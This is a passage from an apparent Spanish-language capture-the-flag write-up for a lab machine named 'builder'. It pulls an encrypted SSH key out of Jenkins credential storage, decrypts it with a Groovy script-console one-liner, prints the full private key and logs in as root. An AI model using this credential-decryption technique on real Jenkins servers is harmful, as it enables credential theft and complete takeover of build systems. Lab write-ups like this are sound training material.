        </com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
```
{: .nolineno}


### Obtener ID_RSA Cifrada Desde Web 

![credentials](/builder/credential.png)


![root](/builder/root.png)


![global](/builder/global.png)


![settings](/builder/settings.png)


![private](/builder/private.png)

### Descifrar la Llave 

![stack](/builder/stack.png)



```bash
println(hudson.util.Secret.decrypt("ID_RSA"))
```
{: .nolineno}


![run](/builder/run.png)


```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
{: .nolineno file="id_rsa"}

```bash
chmod 600 id_rsa
```
{: .nolineno}


```bash
ssh root@10.10.11.10 -i id_rsa

Last login: Wed Feb 21 03:33:52 2024 from 10.10.14.148
root@builder:~# whoami
root
root@builder:~# hostname
builder
```
{: .nolineno}





